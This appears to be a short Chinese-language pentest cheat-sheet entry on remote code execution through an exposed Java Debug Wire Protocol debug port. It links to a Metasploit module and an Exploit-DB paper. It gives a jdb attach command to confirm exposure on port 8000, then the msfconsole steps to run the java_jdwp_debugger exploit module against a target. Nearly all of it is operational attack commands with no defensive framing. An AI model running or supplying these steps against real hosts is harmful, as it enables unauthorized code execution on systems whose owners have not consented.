# Java Debug Wire Protocol remote code
* [https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger](https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger)
* [https://www.exploit-db.com/papers/27179/](https://www.exploit-db.com/papers/27179/)
## 验证
`jdb -attach x.x.x.x:8000`执行成功就存在
## 利用
```
             msfconsole 
      msf > use exploit/multi/misc/java_jdwp_debugger
      msf exploit(java_jdwp_debugger) > show targets
            ...targets...
      msf exploit(java_jdwp_debugger) > set TARGET <target-id>
      msf exploit(java_jdwp_debugger) > show options
            ...show and set options...
      msf exploit(java_jdwp_debugger) > exploit
```

